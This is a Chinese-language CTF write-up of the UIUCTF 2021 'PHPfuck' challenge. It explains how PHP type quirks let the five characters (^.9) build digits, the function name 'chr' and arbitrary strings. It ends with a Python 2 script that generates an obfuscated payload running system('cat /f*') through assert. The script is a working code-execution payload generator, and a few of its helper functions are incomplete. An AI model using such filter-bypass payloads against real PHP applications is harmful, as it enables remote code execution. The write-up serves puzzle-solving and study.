
title:  5种字符'(^.9)'构造php_shellcode
categories: [CTF]
tags: [php,web]

---
2021_uiuctf中出了一道jali题PHPfuck,题目要求用5种字符构造出php shellcode,感觉很有意思便记录下来。<!--more-->

## 题目描述

这道题给的很洁净，就是下面的代码：

```php
<?php
// Flag is inside ./flag.php :)
($x=str_replace("`","",strval($_REQUEST["x"])))&&strlen(count_chars($x,3))<=5?print(eval("return $x;")):show_source(__FILE__)&&phpinfo();
```

（当然在比赛结束后，官方也分享了环境https://github.com/sigpwny/UIUCTF-2021-Public/tree/master/jail/phpfuck）

题目通过了`strlen(count_chars($x,3))<=5`限制我们最多用5个字符。

这五个字符，一度困扰了我很久，因为我一开始想到的是`(^.')`。。。。。。

## PHP特性

### 双标的`.`

在php中，`.`号又对于两个字符串间有连接的作用

```php
var_dump('le'.'xsd6') #string(6) "lexsd6"
```

对两个数字间的`.`号，php会将他们看作是小数关系

```
var_dump(1.2) #float(1.2)
```

但，如把`.`号附近的数字用括号括起来php会把他们进行字符串般的对待

```php
var_dump((1));#int(1)
var_dump((2));#int(2)
var_dump((1).(2));#string(2) "12"
```

同时由于php对于大于309长度的数字转化为`INF`,`INF`与`(9)`同连接符号`.`得到string  `"INF9"`。

```php
var_dump(999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999);
# float(INF)
var_dump((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9));
# string(4) "INF9"
```



### 奇怪的`^`

由于php变量的特性。在进行`^`操作时，其结果也有些微妙变化。

```php
var_dump('9'^(1)); #int(8)
var_dump('9'^'1');#string(1) ""
var_dump('9'^1)#;int(8)

    
var_dump('99'^(1));#int(98)
var_dump('99'^'1');#string(1) ""
var_dump('99'^1);#int(98)

var_dump('99'^(11));#int(104)
var_dump('99'^'11');#string(2) ""
var_dump('99'^11);#int(104)

var_dump('c'^11);#int(11)
var_dump('c'^'11');#string(1) "R"
var_dump('c'^(11));#int(11)


var_dump('cc'^11);#int(11)
var_dump('cc'^'11');#string(2) "RR"
var_dump('cc'^(11));#int(11)
```

可以上看到几点：

1. 数字字符串（string型数字，如上：'99'.'9'）在与int数字进行`^`操作时，会把两者都视为int数字来进行操作。所以`'9'^(1)`实际上是`9^1`而不是`'\x39'^1`.
2. 两不同字符串相`^`时，结果字符串长度跟原字符串两者中最小字符串长度的字符相等。(例:`'c'^'11' == "R"`)
3. 字符字符串与int数字相与时，结果为原来int数字

### 小数四舍五入

在php中会把`.99`自动看成是小数`0.99`。

同当一个浮点数的小数位大于`.99999999999999999995`时，会自动变成进一位。小于会丢弃最后一位：

```PHP
var_dump(.999999999999994);#float(0.99999999999999)
var_dump(.999999999999995);#float(1)
var_dump(.999999999999999);#float(1)


var_dump(3.99999999999994);#float(3.9999999999999)
var_dump(3.99999999999995);#float(3.9999999999999)
var_dump(3.999999999999955);#float(4)
var_dump(3.99999999999996);#float(4)
var_dump(3.99999999999999);#float(4)

```



## 构造思路

### 构造任意数字

由于上面的特性,我们可以用`9(^).`这个字符简单的构造些数字如:

```python
        '106':'(99^9)',
        '99':'(99)',
        '19':'(((.99999999999999999999).(9))^(9)^(9))',
        '7':'(99.999999999999999999^99)',
        '3':'(9.9999999999999999999^9)',
        '1':'(.99999999999999999999)',
        '0':'(9^9)',
        '9':'(9)',
```

我们再让这些数字相互`^`进而得到所有的单字符数字(`0-9`)

```
'1': '(.99999999999999999999)', 
'0': '(9^9)', 
3': '(9.9999999999999999999^9)', 
'2': '((9.9999999999999999999^9)^(.99999999999999999999))', 
'5':'(((99.999999999999999999^99)^(9.9999999999999999999^9))^(.99999999999999999999))', 
'4': '((99.999999999999999999^99)^(9.9999999999999999999^9))',
'7': '(99.999999999999999999^99)',
'6': '((99.999999999999999999^99)^(.99999999999999999999))', 
'9': '(9)', 
'8': '((9)^(.99999999999999999999))'}
```

### 通过可变函数构造任意字符

#### 可变函数

在php高版本中我们可以通过字符串+`(变量)`的方式来调用函数.例:

```php
('phpinfo')()#phpinfo()
('syStem')('ls')#system('ls')
```

同时，由于php函数名是不区分大小的

```php
chr() ==CHr()
'cHr'()=chr()
```

我们只要构造出`C/c`、`H/h`、`R/r`就可以调用`chr`从而构造任意字符。

#### 构造chr

我们可以通过`'INF9'`,构造出不分大小写的`chr`.

经过test后发现:

```
'I'^'3'^'9' =='C'
'N'^'1'^'7'='H'
'F'^'4' =='r'
```

于是我们可以让：

```php
(‘INF‘.(9))^('314')^('97\X00X00')=='CHr';
#即
'CHr'==((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999999^9).(.99999999999999999999).((99.999999999999999999^99)^(9.9999999999999999999^9))))^((9).(99.999999999999999999^99).(((9).(9))^((9).(9)))));
```



## 解题脚本

```php
#python2
# -*- coding: utf-8 -*-
def init():
    num={
        '106':'(99^9)',
        '99':'(99)',
        '19':'(((.99999999999999999999).(9))^(9)^(9))',
        '7':'(99.999999999999999999^99)',
        '3':'(9.9999999999999999999^9)',
        '1':'(.99999999999999999999)',
        '0':'(9^9)',
        '9':'(9)',
    }
    for y in range(3):
        key=num.keys()
        for i in range(len(key)):
            for x  in range(len(key)):
                k=(int(key[x])^int(key[i]))
                if num.has_key(str(k))== False:
                    num[str(k)]='('+num[key[x]]+'^'+num[key[i]]+')'
    return num

def one_num(num):
    onum={}
    key=num.keys()
    for i in range(len(key)):
        if len(key[i])==1:
            onum[(key[i])]=num[key[i]]
    return onum
def get_null(long=1):
    
    null='11'

def chrstr(I,N,F):
    global int_num
    I=I.split('^')
    N=N.split('^')
    F=F.split('^')
    MAX_num=max(len(I),len(N),len(F))
    num=int_num
    num['null']='(((9).(9))^((9).(9)))'
    ret='((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))'
    #print(I,N,F)
    if len(F)<MAX_num:
        
            F.append('null')
    for i in range(MAX_num):
        ret='('+ret+"^("+int_num[I[i]]+"."+int_num[N[i]]+"."+int_num[F[i]]+"))"
    #print(ret)
    return ret
    #print(result)
def guess_chr():
    global int_num
    num=int_num
    I_test={}
    N_test={}
    F_test={}
    want='chr'
    want=want.upper()
    num_int=num.keys()
    
    for x in num_int:
        for y in num_int:
                k=(chr(ord('I')^ord(x)^ord(y)))
                if I_test.has_key(k)== False:
                     I_test[k]=(x)+'^'+(y)
                k=(chr(ord('N')^ord(x)^ord(y)))
                if N_test.has_key(k)== False:
                     N_test[k]=(x)+'^'+(y)
                k=(chr(ord('F')^ord(x)^ord(y)))
                if F_test.has_key(k)== False:
                     F_test[k]=(x)+'^'+(y)
    for x in num_int:
       
                k=(chr(ord('I')^ord(x)))
                if I_test.has_key(k)== False:
                    I_test[k.upper()]=(x)
                k=(chr(ord('N')^ord(x)))
                if N_test.has_key(k)== False:
                    N_test[k.upper()]=(x)
                k=(chr(ord('F')^ord(x)))
                if F_test.has_key(k)== False:
                     F_test[k.upper()]=(x)
    if I_test.has_key(want[0])== False:
            print('I not much')
            exit()
   
           
    if N_test.has_key(want[1])== False:
            print('N not much')
            exit()
  
    if F_test.has_key(want[2])== False:
            print('F not much')
            exit()

    #print(F_test)
    return chrstr(I_test[want[0]],N_test[want[1]],F_test[want[2]])


def guess(want):
    global int_num
    want=str(ord(want))
    ret=''
    for i in want:
        ret+=int_num[i]+'.'

    return ret[:-1]
    
    
def shell(fun,code):#有参数函数
    ret=''
    sym=['(','^','.',')']
    global chr_str
    for i in fun:
        
            ret+=chr_str+'('+guess(i)+').'
            
    ret="("+ret[:-1]+')(('
    
    for x in code:
        
            ret+=chr_str+'('+guess(x)+').'
            

    ret=ret[:-1]+'))'
    return ret

def code(xx):#无差数函数

    for x in xx:
        
            ret+=chr_str+'('+guess(x)+').'
            

    ret=ret[:-1]+'))'
    return ret


if __name__ =='__main__':

    num=init()
    int_num=one_num(num)
    chr_str=guess_chr()
    x=(shell('assert','system("cat /f*")'))


    print(x)
    print(len(x))
```

## 后记

勉强完成出解题的脚本，但是一直在思考一个问题.在高版本php中,assert和eval是不可作为可变函数的,那么还有没有什么方法来进行代码执行.



